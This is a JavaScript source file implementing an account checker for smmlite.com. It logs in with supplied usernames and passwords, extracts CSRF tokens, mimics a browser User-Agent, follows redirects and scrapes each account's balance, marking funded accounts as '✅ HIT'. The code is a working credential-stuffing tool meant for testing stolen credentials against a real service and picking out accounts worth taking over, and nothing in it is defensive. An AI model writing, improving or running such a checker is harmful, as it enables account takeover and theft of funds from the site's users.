// lib/checkCore.js – SMMLite with detailed logging and improved headers
async function fetchWithCookies(url, options = {}, cookieJar = {}) {
  const cookieString = Object.entries(cookieJar)
    .map(([k, v]) => `${k}=${v}`)
    .join('; ');
  const headers = {
    ...options.headers,
    'Cookie': cookieString,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
  };
  const res = await fetch(url, { ...options, headers, redirect: 'manual' });
  const setCookie = res.headers.get('set-cookie');
  if (setCookie) {
    const cookies = setCookie.split(',').map(c => c.trim());
    for (const cookie of cookies) {
      const [nameValue, ...parts] = cookie.split(';');
      const [name, value] = nameValue.split('=');
      if (name && value) cookieJar[name.trim()] = value.trim();
    }
  }
  return res;
}

async function fetchWithRetry(url, options = {}, retries = 2) {
  for (let i = 0; i < retries; i++) {
    try {
      const res = await fetch(url, options);
      return res;
    } catch (e) {
      if (i === retries - 1) throw e;
      await new Promise(r => setTimeout(r, 500));
    }
  }
}

function extractCsrf(html) {
  const patterns = [
    /<input[^>]*name="_csrf"[^>]*value="([^"]+)"/,
    /<input[^>]*name="LoginForm\[_csrf\]"[^>]*value="([^"]+)"/,
    /<input[^>]*name="_csrf"[^>]*value="([^"]+)"/i
  ];
  for (const pattern of patterns) {
    const match = html.match(pattern);
    if (match) {
      console.log('[DEBUG] CSRF found:', match[1].substring(0, 20));
      return match[1];
    }
  }
  console.log('[DEBUG] CSRF not found in HTML');
  return null;
}

function extractBalance(html) {
  console.log('[DEBUG] Extracting balance from HTML length:', html.length);
  // Try class-based patterns
  const classRegex = /<[^>]*class="[^"]*(?:money|balance|navbar-money)[^"]*"[^>]*>([^<]*)<\/[^>]*>/g;
  let match;
  while ((match = classRegex.exec(html)) !== null) {
    const text = match[1].trim();
    const numMatch = text.match(/(\d+(?:[.,]\d+)?)/);
    if (numMatch) {
      const num = parseFloat(numMatch[1].replace(',', '.'));
      if (!isNaN(num)) {
        console.log('[DEBUG] Balance found via class:', num);
        return num;
      }
    }
  }
  // Try global text search
  const text = html.replace(/<[^>]*>/g, ' ');
  const globalMatch = text.match(/[\$\€\₺]\s*(\d+(?:[.,]\d+)?)/);
  if (globalMatch) {
    const num = parseFloat(globalMatch[1].replace(',', '.'));
    if (!isNaN(num)) {
      console.log('[DEBUG] Balance found via global:', num);
      return num;
    }
  }
  console.log('[DEBUG] Balance not found, returning 0');
  return 0;
}

export async function checkAccount(username, password) {
  const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
  const cookieJar = {};

  try {
    console.log(`[DEBUG] Checking account: ${username}`);

    // 1. GET home for CSRF
    const homeRes = await fetchWithCookies('https://smmlite.com/', {
      method: 'GET',
      headers: {
        'User-Agent': userAgent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Referer': 'https://smmlite.com/'
      }
    }, cookieJar);
    const homeHtml = await homeRes.text();
    console.log(`[DEBUG] Home page status: ${homeRes.status}, length: ${homeHtml.length}`);

    const csrf = extractCsrf(homeHtml);
    if (!csrf) {
      console.log('[DEBUG] CSRF missing');
      return { valid: false, hit: false, balance: 0, message: 'CSRF token not found' };
    }

    // 2. POST login
    const formData = new URLSearchParams();
    formData.append('LoginForm[username]', username);
    formData.append('LoginForm[password]', password);
    formData.append('LoginForm[remember]', '1');
    formData.append('_csrf', csrf);

    const loginRes = await fetchWithCookies('https://smmlite.com/', {
      method: 'POST',
      headers: {
        'User-Agent': userAgent,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://smmlite.com/',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
      },
      body: formData.toString()
    }, cookieJar);

    console.log(`[DEBUG] Login response status: ${loginRes.status}`);

    // Handle redirects
    let finalHtml;
    let finalUrl = loginRes.url;
    if (loginRes.status >= 300 && loginRes.status < 400) {
      const location = loginRes.headers.get('location');
      if (location) {
        const redirectUrl = location.startsWith('http') ? location : `https://smmlite.com${location}`;
        console.log(`[DEBUG] Following redirect to: ${redirectUrl}`);
        const followRes = await fetchWithCookies(redirectUrl, {
          method: 'GET',
          headers: { 'User-Agent': userAgent, 'Referer': 'https://smmlite.com/' }
        }, cookieJar);
        finalHtml = await followRes.text();
        finalUrl = followRes.url;
      } else {
        const body = await loginRes.text();
        const match = body.match(/<a href="([^"]+)"/);
        if (match) {
          const redirectUrl = match[1].startsWith('http') ? match[1] : `https://smmlite.com${match[1]}`;
          console.log(`[DEBUG] Following redirect from body to: ${redirectUrl}`);
          const followRes = await fetchWithCookies(redirectUrl, {
            method: 'GET',
            headers: { 'User-Agent': userAgent, 'Referer': 'https://smmlite.com/' }
          }, cookieJar);
          finalHtml = await followRes.text();
          finalUrl = followRes.url;
        } else {
          finalHtml = body;
        }
      }
    } else {
      finalHtml = await loginRes.text();
    }

    console.log(`[DEBUG] Final URL: ${finalUrl}`);
    const isLoggedIn = finalHtml.toLowerCase().includes('logout') || finalUrl.includes('dashboard');
    console.log(`[DEBUG] Logged in: ${isLoggedIn}`);

    if (!isLoggedIn) {
      console.log(`[DEBUG] Login failed for: ${username}`);
      return { valid: false, hit: false, balance: 0, message: 'Invalid credentials' };
    }

    const balance = extractBalance(finalHtml);
    console.log(`[DEBUG] Balance for ${username}: ${balance}`);

    const isHit = balance >= 0.003;
    return {
      valid: true,
      hit: isHit,
      balance: balance,
      message: isHit ? '✅ HIT' : (balance > 0 ? '🆓 FREE (balance < $0.003)' : '🆓 FREE ($0)')
    };

  } catch (err) {
    console.error(`[ERROR] checkAccount error for ${username}:`, err.message);
    return {
      valid: false,
      hit: false,
      balance: 0,
      message: `Error: ${err.message}`
    };
  }
}
